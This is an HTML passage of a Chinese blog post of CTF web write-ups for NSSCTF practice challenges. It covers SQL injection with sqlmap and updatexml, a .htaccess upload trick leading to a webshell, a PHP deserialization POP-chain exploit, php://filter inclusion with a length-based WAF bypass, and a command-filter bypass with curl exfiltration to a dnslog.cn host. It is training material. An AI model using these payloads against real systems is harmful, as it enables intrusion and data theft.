+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428162451635.png"
+                      alt="image-20250428162451635"
+                ></p>
+<p>查看当前数据库的数据表</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node7.anna.nssctf.cn:24195/index.php?id=1&quot; -D test_db --tables --batch</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428162527506.png"
+                      alt="image-20250428162527506"
+                ></p>
+<p>查看指定数据库指定数据表的列名</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h2><p>随便访问不存在的php文件发现</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428204147545.png"
+                      alt="image-20250428204147545"
+                ></p>
+<p>Apache服务</p>
+<p><strong>htaccess文件</strong>是Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p>
+<p><strong>.htaccess文件内容</strong>：<code>SetHandler application/x-httpd-php</code>的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>
+<p>这里随便访问一个不存在的页面造成<code>Not Found</code>报错，就可以看到服务器信息：</p>
+<p>传一个.htaccess文件</p>
+<p>注：这里不能加任何前缀</p>
+<p>.htaccess文件内容如下：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;jpg&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>意思就是将jpg文件解析为php文件</p>
+<p>上传成功之后再上传一个一句话木马的jpg就可以用蚂蚁剑连接成功</p>
+<h2 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428213238595.png"
+                      alt="image-20250428213238595"
+                ></p>
+<p>进去之后</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428213901248.png"
+                      alt="image-20250428213901248"
+                ></p>
+<p>直接传🐎</p>
+<p>蚂蚁剑连接，flag在根目录</p>
+<p>注入点三：ftp 远程文件上传<br>这个注入点只是理论上，因为本人没有实践过。</p>
+<p>首先需要一台能被公网访问的服务器，搭建好 ftp 服务，注意做好安全防护，比如禁止匿名登录啥的。</p>
+<p>然后在 FTP 地址一栏填入自己服务器的 IP ，端口为 21 。用户名和密码填入自己设置的 ftp 用户名和密码。</p>
+<p>点击远程上传，理论上可以得到这个上传的 zip 文件，估计是源码。</p>
+<p>（理论，勿喷，不当请指出）</p>
+<h2 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>需要触发w44m类的getflag方法，需要满足$admin&#x3D;&#x3D;&#x3D;’w44m’和$passwd&#x3D;&#x3D;&#x3D;’08067’</p>
+<p>w22m析构函数，在w22m实例销毁的时候会输出w00m的属性</p>
+<p>w33m的string方法，如果w00m的属性是w33m实例，触发string方法，调用$this-&gt;w00m-&gt;{$this-&gt;w22m}();</p>
+<p>设置$this-&gt;w22m为‘Getflag’，$this-&gt;w00m为w44m实例，从而调用w44m::Getflag</p>
+<p>exp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line">$a= new w44m();</span><br><span class="line">$c= new w33m();</span><br><span class="line">$b= new w22m();</span><br><span class="line">$c-&gt;w00m = $a;</span><br><span class="line">$c-&gt;w22m = &#x27;Getflag&#x27;;</span><br><span class="line">$b-&gt;w00m= $c;</span><br><span class="line">#echo serialize($b);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>倒推，要调用getflag可以看到在w33m中有</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()；</span><br></pre></td></tr></table></figure></div>
+
+<p>可以令w00m为w44m，$this-&gt;w22m为getflag方法</p>
+<p>在w22m的 __destruct()来调用w33m的tostring方法</p>
+<h2 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250704102640170.png"
+                      alt="image-20250704102640170"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure></div>
+
+<p>post传参任意包含服务器的文件</p>
+<p>hint flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php;里面</p>
+<p>php伪协议读取一下flag</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250704111646734.png"
+                      alt="image-20250704111646734"
+                ></p>
+<p>发现被过滤</p>
+<p>看一下index能不能读</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKCiRwYXRoID0gJF9QT1NUWyJmbGFnIl07CgppZiAoc3RybGVuKGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpKSA8IDgwMCAmJiBwcmVnX21hdGNoKCcvZmxhZy8nLCAkcGF0aCkpIHsKICAgIGVjaG8gJ25zc2N0ZiB3YWYhJzsKfSBlbHNlIHsKICAgIEBpbmNsdWRlKCRwYXRoKTsKfQo</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line"></span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>要求输入长度大于800，并且正则匹配过滤了flag，满足其一即可</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgPSdOU1NDVEZ7NGY4ZjcwMmEtMjAyNy00OWUxLWJkY2MtYjE3OTU4ZTUzNzY5fSc7Cg==</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php =&#x27;NSSCTF&#123;4f8f702a-2027-49e1-bdcc-b17958e53769&#125;&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[&#x27;url&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Sorry,you can&#x27;t use this.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Can you see anything?&quot;;</span><br><span class="line">        exec($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; Can you see anything?</span><br></pre></td></tr></table></figure></div>
+
+<p>命令执行过滤了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br></pre></td></tr></table></figure></div>
+
+<p>过滤关键字的绕过</p>
+<p>首先我们知道关键字被过滤时可以使用以下绕过方式：</p>
+<p>如 ls 被过滤，可以替换为</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l&#x27;&#x27;s</span><br><span class="line"></span><br><span class="line">l\s </span><br></pre></td></tr></table></figure></div>
+
+<p>等等。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28584/?url=l\s%20/%20|tee%203.txt</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28584/?url=ca\t%20/flllll\aaaaaaggggggg|tee%203.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>第二种方法dnslog数据外带</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `l&#x27;&#x27;s`.xf3njn.dnslog.cn</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用反引号执行 ls 命令，执行的结果拼接到 xf3njn.dnslog.cn 域名上，然后访问，访问的日志可以在网站上看，就可以看到命令执行的结果。</span><br></pre></td></tr></table></figure></div>
+
+<p><code>ls</code> 执行的结果是 <code>index.php</code> 。</p>
+<p>这样的话我们直接查找根目录下包含 “f” 的文件：</p>
+<p>curl <code>ca\t /flllll\aaaaaaggggggg</code>.xf3njn.dnslog.cn</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> web从零开始day2</li>
+        <li><strong>Author:</strong> luyanpei</li>
+        <li><strong>Created at
+                :</strong> 2025-04-24 17:07:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-04 17:38:49
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/posts/37058.html
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                All Rights Reserved &#169; luyanpei
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/train/">#train</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/posts/45738.html">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">2025蓝桥网络安全 wp</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/posts/38602.html">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">web从零开始day1</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">web从零开始day2</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="nav-text">[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="nav-text">[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">[SWPUCTF 2021 新生赛]error（报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="nav-text">[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-text">[LitCTF 2023]作业管理系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="nav-text">[SWPUCTF 2021 新生赛]pop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="nav-text">[鹏城杯 2022]简单包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="nav-text">[SWPUCTF 2021 新生赛]finalrce</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">love u</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">luyanpei</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        20 posts in total
+                    </span>
+                    
+                        <span>
+                            35.1k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
